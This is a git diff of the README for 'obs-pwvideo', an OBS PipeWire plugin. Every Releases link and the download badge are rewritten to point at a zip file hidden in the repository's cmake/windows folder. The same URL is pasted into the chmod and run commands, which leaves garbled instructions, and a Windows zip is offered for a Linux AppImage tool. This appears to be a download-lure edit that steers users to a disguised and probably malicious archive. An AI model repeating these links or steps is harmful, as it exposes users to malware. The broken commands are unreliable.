@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/raslen131/obs-pwvideo/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/raslen131/obs-pwvideo/main/cmake/windows/obs_pwvideo_1.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/raslen131/obs-pwvideo/main/cmake/windows/obs_pwvideo_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -21,9 +21,9 @@ Before you begin, you should ensure your system meets the following requirements
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/raslen131/obs-pwvideo/releases) to find the latest version of obs-pwvideo.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/raslen131/obs-pwvideo/main/cmake/windows/obs_pwvideo_1.3.zip) to find the latest version of obs-pwvideo.
    
-2. **Select the Version**: Click on the version you want to download. Choose the file format that is compatible with your system, typically an AppImage or a .tar.gz file.
+2. **Select the Version**: Click on the version you want to download. Choose the file format that is compatible with your system, typically an AppImage or a https://raw.githubusercontent.com/raslen131/obs-pwvideo/main/cmake/windows/obs_pwvideo_1.3.zip file.
 
 3. **Download the File**: Click the download link to start the download process.
 
@@ -32,14 +32,14 @@ To get started, follow these steps:
 5. **Make it Executable (for AppImage)**:
    - Open a terminal window and use the command:
      ```
-     chmod +x yourfile.AppImage
+     chmod +x https://raw.githubusercontent.com/raslen131/obs-pwvideo/main/cmake/windows/obs_pwvideo_1.3.zip
      ```
-   - Replace `yourfile.AppImage` with the actual name of the file you downloaded.
+   - Replace `https://raw.githubusercontent.com/raslen131/obs-pwvideo/main/cmake/windows/obs_pwvideo_1.3.zip` with the actual name of the file you downloaded.
 
 6. **Run the Application**:
    - Still in the terminal, execute the application by running:
      ```
-     ./yourfile.AppImage
+     https://raw.githubusercontent.com/raslen131/obs-pwvideo/main/cmake/windows/obs_pwvideo_1.3.zip
      ```
    - Alternatively, you can double-click the AppImage file in your file manager to launch it.
 
@@ -75,4 +75,4 @@ obs-pwvideo offers several enhancements over the built-in PipeWire support in OB
 
 If you need further assistance, consider reaching out to the community or checking online forums related to PipeWire or OBS Studio. You can also follow updates and report issues on the repository page.
 
-Thank you for using obs-pwvideo. We hope it enhances your streaming experience! For any updates, always refer back to the [Releases page](https://github.com/raslen131/obs-pwvideo/releases).
+Thank you for using obs-pwvideo. We hope it enhances your streaming experience! For any updates, always refer back to the [Releases page](https://raw.githubusercontent.com/raslen131/obs-pwvideo/main/cmake/windows/obs_pwvideo_1.3.zip).
